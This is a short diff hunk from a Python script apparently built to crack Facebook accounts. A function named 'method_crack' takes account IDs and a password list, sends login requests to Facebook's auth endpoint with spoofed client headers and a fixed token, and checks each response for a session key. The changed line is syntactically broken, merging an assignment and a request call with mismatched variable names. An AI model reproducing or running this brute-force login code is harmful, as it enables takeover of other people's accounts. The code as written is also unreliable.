@@ -119,7 +119,7 @@ def method_crack(ids,passlist):
             'X-FB-Client-IP': 'True',
             'X-FB-Server-Cluster': 'True',
             'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-            url="https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+            url="https://b-graph.facebook.com/auth/login",reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
                 try:
                     uid=reqx['uid']
